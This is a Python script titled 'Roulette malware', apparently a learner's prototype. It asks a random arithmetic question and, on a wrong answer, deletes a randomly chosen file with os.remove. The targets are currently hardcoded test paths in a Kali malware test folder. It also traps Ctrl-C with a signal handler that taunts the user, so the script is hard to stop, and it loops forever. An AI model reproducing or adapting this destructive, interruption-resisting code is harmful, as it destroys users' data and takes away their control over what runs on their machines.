## Roulette malware

import os
import random
import time

safe_gun = ("""
 
            ,___________________________________________/7_ 
           |-_______------. `\                             |
       _,/ | _______)     |___\____________________________|
  .__/`((  | _______      | (/))_______________=.
     `~) \ | _______)     |   /----------------_/
       `__y|______________|  /
       / ________ __________/
      / /#####\(  \  /     ))
     / /#######|\  \(     //
    / /########|.\______ad/`
   / /###(\)###||`------``
  / /##########||
 / /###########||
( (############||
 \ \####(/)####))
  \ \#########//
   \ \#######//
    `---|_|--`
       ((_))
        `-`

""")

shot_gun = ("""
            ,___________________________________________/7___ 
           |-_______------. `\_______________________________|   ~~ |====}
       _,/ | _______)     |___\____________________________|  
  .__/`((  | _______      | (/))_______________=.
     `~) \ | _______)     |   /----------------_/
       `__y|______________|  /
       / ________ __________/
      / /#####\(  \  /     ))
     / /#######|\  \(     //
    / /########|.\______ad/`        BANG! BANG!
   / /###(\)###||`------``
  / /##########||
 / /###########||
( (############||
 \ \####(/)####))
  \ \#########//
   \ \#######//
    `---|_|--`
       ((_))
        `-`

""")

def main():
    #os.system("clear")
    print("##### Russian Roulette! ##############################")
    print(safe_gun)
    print("Answer the question correctly or have a random file/directory deleted!")


    question_list = [question_one.q, question_two.q, question_three.q , question_four.q]
    rand_question = random.choice(question_list)


    ## -- answer logic -- ##
    if rand_question == question_one.q:
        ans = question_one.ans
    if rand_question == question_two.q:
        ans = question_two.ans
    if rand_question == question_three.q:
        ans = question_three.ans
    if rand_question == question_four.q:
        ans = question_four.ans
    
    user_input = input(rand_question + ": ")
    if user_input == "specialescape":
        exit()
    elif user_input != ans:
        print(""" \n
        #########################
        !!    WRONG ANSWER     !!
        #########################
        \n""")
        print(shot_gun)
        file_nuke()
    elif user_input == ans:
        print("Safe... for now")
        exit()

## Question Blocks ##   

def question_one():
    question_one.q = "what is 1 + 1"
    question_one.ans = "2"

def question_two():
    question_two.q = "what is 2 + 1"
    question_two.ans = "3"

def question_three():
    question_three.q = "what is 3 + 1"
    question_three.ans = "4"

def question_four():
    question_four.q= "what is 4 + 1"
    question_four.ans = "5"

## file nuke ##

def file_nuke():
    print("""\n
    #########################
    DEBUG: Stand in fake removal for testing
    #########################
    \n""")

    file = (
        "/home/kali/Documents/malware/test/file1",
        "/home/kali/Documents/malware/test/file2",
        "/home/kali/Documents/malware/test/file3",
    )


    file_delete = random.choice(file)

    print("Removing: " + file_delete)

    try:
        os.remove(file_delete)
    except: 
        print("You got lucky, file already deleted")
    
    print("Waisting 5 seconds...")
    time.sleep(5)




## loading questions + answers ##
def load():
    question_one()
    question_two()
    question_three()
    question_four()




#load()
#main()

## -- CTRL C evasion denial
import signal
import sys

def signal_handler(sig, frame):
    print('\nNice Try - press enter to continue - and delete a file due to not playing the game :)')
    #file_nuke()

signal.signal(signal.SIGINT, signal_handler)



while True:
    load()
    main()

